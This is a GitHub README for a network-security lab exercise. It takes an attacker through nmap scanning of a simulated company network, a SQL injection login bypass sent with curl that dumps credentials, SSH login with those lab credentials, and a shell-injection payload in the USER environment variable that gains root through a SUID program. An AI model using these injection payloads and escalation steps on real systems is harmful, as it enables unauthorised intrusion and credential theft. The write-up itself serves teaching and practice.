# NetworkSecurity-Project

Network Security project about SSH, Database and SQL Injection.

# Network Scheme

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/network_scheme.svg" width=500>

-   Web Network nodes:
    1. Web Server hosting a stub website using NodeJS.
    2. MySQL Server hosting sensitive information.
-   Employee Network nodes:
    1. BobPC which represents the hacker host.
    2. TomPC which represents the target host.
-   Company Network nodes:
    1. All the Employee network nodes.
    2. Web Server.

# Background Scenario

This lab is about industrial espionage, represented by the attacker Bob, who is infiltrated inside a company lan network and has found, among a lot of devices, one vulnerable computer that belongs to Tom and an useful website open ONLY inside the company network.

During the demonstration scenario, we discovered these IPs from 2 different subnets:

-   _193.20.3.1_ - Company Network 
-   _193.20.3.2_ - Bob PC on company network

-   _193.20.1.1_ - Employee Network
-   _193.20.1.2_ - Bob PC on employee network
-   _193.20.1.3_ - Tom PC on employee network

And we don't have any access to the Web network.

# Instruction: what to do

We can start connecting to the pentesting PC with SSH using 2222 port.

1. Footprinting: gather information online about the organization and its systems.
2. Scanning: scan vulnerable point of access.
3. Enumeration: intrusive probing of vulnerable services.
4. Exploitation: attack those potential vulnerability.

## Footprinting

In this case scenario we're already connected to the local network, so we've already gathered enough information about our target.

We start by finding out our IP address on the networks using `ifconfig` command:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/ifconfig_bob.png" width=500>

Then, we discover some IPs using then `nmap` tool with these options:

-   “-sn” means “no port scan”.
-   “-PE” sends ICMP Echo Request.
-   “--send-ip” to not send ARP packets.

**_Company Network:_**
<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/footprinting_company_network.png" width=500>

**_Employee Network_:**

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/footprinting_employee_network.png" width=500>

## Scanning

We're interested in the Web Server and in Tom PC, so we can scan more aggressively them to find information about any open ports.

If we use simply a TPC SYN scan from nmap, we find vague information:

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/scanning_company_ss.PNG" width=500>

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/scanning_employee_ss.PNG" width=500>

## Enumeration

Instead, if we explore deeply with a Version Detection scan through nmap, we can obtain service fingerprints on the hosts:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/enumeration_company_sv.PNG" width=500>

The web server is implemented with NodeJS on port 8080 and has a connection with a MySQL database.

Meanwhile on Tom PC, we found an OpenSSH port:

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_tom_sv.PNG" width=500>

Firstly, we explore the website on the Web Server to find vulnerabilities, then exploit the OpenSSH port on Tom PC.

We retrieved the html page using `curl`, which contains a login form, that we can try to exploit.

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.png" width=500>


## Exploitation

We can try some usual combination for the form:

```bash
curl -X POST -d 'username=&password=b' 193.20.3.1:8080
```

Which returns "Error value(s) missing"

```bash
curl -X POST -d 'username=a&password=b' 193.20.3.1:8080
```

Which returns

`{"success":false,"response":"No user found","result":[]}`

Lastly, we can try one with MySQL injection using OR and commenting syntax:

```bash
curl -X POST -d 'username=" OR 1<2; -- &password=b' 193.20.3.1:8080
```

which returns a list of credentials:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sql.png" width=700>

including only one entry related to a user named Tom with credentials:

```
username = tcasaccio1
password = YLN1NrMdGN
```

## SSH Access

Now that we have gathered this information, we can try using the credentials above to gain access to the open SSH port on Tom PC.

We can log in using:

```bash
ssh tcasaccio1@193.20.1.3
```

# Privilege Escalation Procedure

From the ssh entrypoint on TomPC, we can trace our privileges on the machine and which files we can access:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_whoami.PNG" width=400>

As we can see, user tcasaccio1 doesn't belong to sudo group, let's see if we can access to /etc/passwd and then to /etc/shadow to retrieve hashed passwords:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_passwd.PNG" width=500>

We have to find another way to gain elevated privileges, let's find files with the SUID bit set:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_suid.PNG" width=400>
<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_suid2.PNG" width=500>

The Set User IDentity bit allows users to run executables with the file system permissions of the executable's owner to perform a specific task, in this case with root privileges.

In /home/tcasaccio1 there is a file with the SUID bit set, let's see if we can exploit this program:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_program.PNG" width=500>

In this case, we can modify the USER environment variable by creating an environment variable injection.

```bash
export USER="; /bin/bash; echo ":tcasaccio1
```

Obtaining this behaviour by the program:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_exploit.PNG" width=500>

So now we have root permissions on the machine.
